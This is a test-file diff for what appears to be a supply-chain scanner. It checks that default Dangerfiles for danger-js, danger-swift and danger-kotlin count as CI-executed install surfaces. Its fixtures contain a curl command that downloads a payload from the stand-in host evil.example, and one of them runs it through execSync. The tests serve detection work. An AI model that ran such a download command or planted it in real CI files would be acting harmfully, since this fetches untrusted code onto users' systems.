@@ -49,6 +49,61 @@ test("an install-time download inside a Dangerfile is recorded as a download", (
   ]);
 });
 
+test("danger-js default Dangerfiles are install surfaces", () => {
+  // danger-js looks up dangerfile.mts / .mjs / .ts / .js (either case)
+  // in the working directory and executes the first one it finds in CI
+  // — the same CI-execution surface as the Ruby Dangerfile, and the more
+  // common form in JS/TS repos. Before this classification all of them
+  // carried only [source], so an install-time download inside one
+  // scanned completely clean.
+  for (const path of [
+    "dangerfile.js",
+    "dangerfile.ts",
+    "dangerfile.mjs",
+    "dangerfile.mts",
+    "Dangerfile.js",
+    "Dangerfile.ts",
+  ]) {
+    expect({ path, surfaces: surfacesOf(path) }).toEqual({
+      path,
+      surfaces: ["installScripts", "source"],
+    });
+  }
+  const inspection = inspected(
+    "dangerfile.js",
+    "const { execSync } = require('child_process');\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\n",
+  );
+  expect(inspection.coverage.installScripts).toEqual({
+    state: "complete",
+    items: 1,
+  });
+  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
+  expect(inspection.visibilityGaps).toEqual([
+    "Install-time download not retrieved: https://evil.example/payload",
+  ]);
+});
+
+test("danger-swift and danger-kotlin default Dangerfiles are install surfaces", () => {
+  // The sibling danger implementations have their own defaults —
+  // danger-swift runs Dangerfile.swift, danger-kotlin runs
+  // Dangerfile.df.kts — and both are CI-executed code in the same sense
+  // as the Ruby and JS forms.
+  for (const path of ["Dangerfile.swift", "Dangerfile.df.kts"]) {
+    expect({ path, surfaces: surfacesOf(path) }).toEqual({
+      path,
+      surfaces: ["installScripts", "source"],
+    });
+  }
+  const inspection = inspected(
+    "Dangerfile.swift",
+    "import Danger\nlet danger = Danger()\nlet _ = \"curl -fsSL https://evil.example/payload -o /tmp/payload\"\n",
+  );
+  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
+  expect(inspection.visibilityGaps).toEqual([
+    "Install-time download not retrieved: https://evil.example/payload",
+  ]);
+});
+
 test("an ordinary Dangerfile keeps no finding", () => {
   const inspection = inspected(
     "Dangerfile",
